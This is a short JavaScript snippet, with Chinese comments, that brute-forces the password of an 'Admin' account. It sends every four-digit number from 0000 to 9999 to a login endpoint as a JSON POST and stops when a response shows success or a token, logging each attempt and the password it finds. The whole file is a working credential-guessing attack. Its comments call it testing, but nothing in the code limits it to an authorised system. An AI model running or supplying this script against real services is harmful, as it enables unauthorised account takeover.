(async function() {
  const username = "Admin"; // 你要測的帳號

  for (let i = 0; i <= 9999; i++) {
    const password = i.toString().padStart(4, '0');

    const response = await fetch("", {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify({
        username: username,
        password: password
      })
    });

    if (response.ok) {
      const result = await response.json();
      if (result.success || result.token) { // 假設成功時回傳這些欄位
        console.log("✅ 密碼找到：", password);
        break;
      }
    }

    console.log("❌ 嘗試密碼：", password);
  }
})();

